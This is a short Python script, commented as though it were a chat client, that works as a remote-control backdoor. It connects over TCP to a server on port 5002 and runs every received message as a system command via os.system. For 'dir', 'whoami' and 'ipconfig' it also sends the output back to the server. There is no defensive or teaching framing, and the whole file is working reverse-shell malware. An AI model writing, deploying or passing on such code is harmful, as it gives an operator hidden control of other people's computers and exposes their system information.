import socket
import os
import random
from threading import Thread
from datetime import datetime
# server's IP address
# if the server is not on this machine, 
# put the private (network) IP address (e.g 192.168.1.2)
SERVER_HOST = input('local ip: ')
SERVER_PORT = 5002 # server's port
separator_token = "<SEP>" # we will use this to separate the client name & message

# initialize TCP socket
s = socket.socket()
print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
print("[+] Connected.")
# prompt the client for a name
name = 'user'

def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        os.system(message)
        if message == "dir" or message == "whoami" or message == "ipconfig":
            os.system(f'{message} > output.txt')
            with open('output.txt', 'r', encoding='cp866') as file:
                lines = file.readlines()
            for line in lines:
                to_send = f"{line}"
                s.send(to_send.encode())

# make a thread that listens for messages to this client & print them
t = Thread(target=listen_for_messages)
# make the thread daemon so it ends whenever the main thread ends
t.daemon = True
# start the thread
t.start()
while 1:
    listen_for_messages()
    os.system(f'del output.txt')

# close the socket
s.close()
